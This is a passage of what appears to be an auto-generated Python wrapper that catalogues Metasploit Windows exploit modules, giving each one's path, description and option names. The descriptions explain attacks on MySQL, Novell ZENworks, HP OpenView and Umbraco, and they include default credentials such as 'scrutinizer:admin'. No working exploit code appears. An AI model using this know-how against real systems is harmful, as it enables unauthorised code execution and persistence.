			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_PATH = 'PATH'

	class windows_mysql_mysql_payload(object):
		"""
		
          This module creates and enables a custom UDF (user defined function) on the
          target host via the SELECT ... into DUMPFILE method of binary injection. On
          default Microsoft Windows installations of MySQL (=< 5.5.9), directory write
          permissions not enforced, and the MySQL service runs as LocalSystem.

          NOTE: This module will leave a payload executable on the target system when the
          attack is finished, as well as the UDF DLL, and will define or redefine sys_eval()
          and sys_exec() functions.
        
		"""

		path = 'windows/mysql/mysql_payload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			FORCE_UDF_UPLOAD = 'FORCE_UDF_UPLOAD'

	class windows_mysql_mysql_start_up(object):
		"""
		
        This module takes advantage of a file privilege misconfiguration problem
        specifically against Windows MySQL servers. This module abuses the FILE
        privilege to write a payload to Microsoft's All Users Start Up directory
        which will execute every time a user logs in. The default All Users Start
        Up directory used by the module is present on Windows 7.
      
		"""

		path = 'windows/mysql/mysql_start_up'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_USERNAME = 'USERNAME'
			required_PASSWORD = 'PASSWORD'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_STARTUP_FOLDER = 'STARTUP_FOLDER'

	class windows_mysql_scrutinizer_upload_exec(object):
		"""
		
        This exploits an insecure config found in Scrutinizer NetFlow & sFlow Analyzer.
        By default, the software installs a default password in MySQL, and binds the
        service to "0.0.0.0".  This allows any remote user to login to MySQL, and then
        gain arbitrary remote code execution under the context of 'SYSTEM'.  Examples
        of default credentials include: 'scrutinizer:admin', and 'scrutremote:admin'.
      
		"""

		path = 'windows/mysql/scrutinizer_upload_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_USERNAME = 'USERNAME'
			required_PASSWORD = 'PASSWORD'
			VHOST = 'VHOST'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_MYSQLPORT = 'MYSQLPORT'
			required_HTTPPORT = 'HTTPPORT'
			required_TARGETURI = 'TARGETURI'

	class windows_mysql_mysql_mof(object):
		"""
		
          This module takes advantage of a file privilege misconfiguration problem
        specifically against Windows MySQL servers (due to the use of a .mof file).
        This may result in arbitrary code execution under the context of SYSTEM.
        This module requires a valid MySQL account on the target machine.
      
		"""

		path = 'windows/mysql/mysql_mof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_USERNAME = 'USERNAME'
			required_PASSWORD = 'PASSWORD'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'

	class windows_mysql_mysql_yassl_hello(object):
		"""
		
          This module exploits a stack buffer overflow in the yaSSL (1.7.5 and earlier)
        implementation bundled with MySQL <= 6.0. By sending a specially crafted
        Hello packet, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/mysql/mysql_yassl_hello'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_novell_zenworks_preboot_op4c_bof(object):
		"""
		
          This module exploits a remote buffer overflow in the ZENworks Configuration
        Management. The vulnerability exists in the Preboot service and can be triggered
        by sending a specially crafted packet with the opcode 0x4c
        (PROXY_CMD_PREBOOT_TASK_INFO2) to port 998/TCP. The module has been successfully
        tested on Novell ZENworks Configuration Management 10 SP2 / SP3 and Windows Server
        2003 SP2 (DEP bypass).
      
		"""

		path = 'windows/novell/zenworks_preboot_op4c_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_novell_zenworks_preboot_op6_bof(object):
		"""
		
          This module exploits a remote buffer overflow in the ZENworks Configuration
        Management 10 SP2. The vulnerability exists in the Preboot service and can be
        triggered by sending a specially crafted packet with the opcode 0x06
        (PROXY_CMD_CLEAR_WS) to the 998/TCP port. The module has been successfully tested
        on Novell ZENworks Configuration Management 10 SP2 and Windows Server 2003 SP2
        (DEP bypass).
      
		"""

		path = 'windows/novell/zenworks_preboot_op6_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_novell_zenworks_preboot_op6c_bof(object):
		"""
		
          This module exploits a remote buffer overflow in the ZENworks Configuration
        Management. The vulnerability exists in the Preboot service and can be triggered by
        sending a specially crafted packet with the opcode 0x6c (PROXY_CMD_GET_NEXT_STEP)
        to port 998/TCP. The module has been successfully tested on Novell ZENworks
        Configuration Management 10 SP2 / SP3 and Windows Server 2003 SP2 (DEP bypass).
      
		"""

		path = 'windows/novell/zenworks_preboot_op6c_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_novell_zenworks_preboot_op21_bof(object):
		"""
		
          This module exploits a remote buffer overflow in the ZENworks Configuration
        Management 10 SP2. The vulnerability exists in the Preboot service and can be
        triggered by sending a specially crafted packet with the opcode 0x21
        (PROXY_CMD_FTP_FILE) to port 998/TCP. The module has been successfully tested on
        Novell ZENworks Configuration Management 10 SP2 and Windows Server 2003 SP2
        (DEP bypass).
      
		"""

		path = 'windows/novell/zenworks_preboot_op21_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_novell_groupwisemessenger_client(object):
		"""
		
          This module exploits a stack buffer overflow in Novell's GroupWise Messenger Client.
        By sending a specially crafted HTTP response, an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/novell/groupwisemessenger_client'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_novell_file_reporter_fsfui_upload(object):
		"""
		
        NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to upload
        arbitrary files via a directory traversal while handling requests to /FSF/CMD with
        FSFUI records with UICMD 130. This module has been tested successfully against NFR
        Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File Reporter 1.0.1).
      
		"""

		path = 'windows/novell/file_reporter_fsfui_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			required_SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_DEPTH = 'DEPTH'

	class windows_novell_zenworks_desktop_agent(object):
		"""
		
          This module exploits a heap overflow in the Novell ZENworks
        Desktop Management agent. This vulnerability was discovered
        by Alex Wheeler.
      
		"""

		path = 'windows/novell/zenworks_desktop_agent'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_novell_netiq_pum_eval(object):
		"""
		
          This module abuses a lack of authorization in the NetIQ Privileged User Manager
        service (unifid.exe) to execute arbitrary perl code. The problem exists in the
        ldapagnt module. The module has been tested successfully on NetIQ PUM 2.3.1 over
        Windows 2003 SP2, which allows to execute arbitrary code with SYSTEM privileges.
      
		"""

		path = 'windows/novell/netiq_pum_eval'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_HTTP_DELAY = 'HTTP_DELAY'

	class windows_novell_nmap_stor(object):
		"""
		
          This module exploits a stack buffer overflow in Novell's Netmail 3.52 NMAP STOR
        verb. By sending an overly long string, an attacker can overwrite the
        buffer and control program execution.
      
		"""

		path = 'windows/novell/nmap_stor'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_hp_nnm_ovalarm_lang(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53.
        By sending a specially crafted CGI request to ovalarm.exe, an attacker can execute
        arbitrary code.

        This specific vulnerability is due to a call to "sprintf_new" in the "isWide"
        function within "ovalarm.exe". A stack buffer overflow occurs when processing an
        HTTP request that contains the following.

        1. An "Accept-Language" header longer than 100 bytes
        2. An "OVABverbose" URI variable set to "on", "true" or "1"

        The vulnerability is related to "_WebSession::GetWebLocale()" ..

        NOTE: This exploit has been tested successfully with a reverse_ord_tcp payload.
      
		"""

		path = 'windows/http/hp_nnm_ovalarm_lang'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_umbraco_upload_aspx(object):
		"""
		
          This module can be used to execute a payload on Umbraco CMS 4.7.0.378.
        The payload is uploaded as an ASPX script by sending a specially crafted
        SOAP request to codeEditorSave.asmx, which permits unauthorised file upload
        via the SaveDLRScript operation. SaveDLRScript is also subject to a path
        traversal vulnerability, allowing code to be placed into the web-accessible
        /umbraco/ directory.

        The module writes, executes and then overwrites an ASPX script; note that
        though the script content is removed, the file remains on the target. Automatic
        cleanup of the file is intended if a meterpreter payload is used.

        This module has been tested successfully on Umbraco CMS 4.7.0.378 on a Windows
        7 32-bit SP1. In this scenario, the "IIS APPPOOL/ASP.NET v4.0" user must have
        write permissions on the Windows Temp folder.
      
		"""

		path = 'windows/http/umbraco_upload_aspx'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
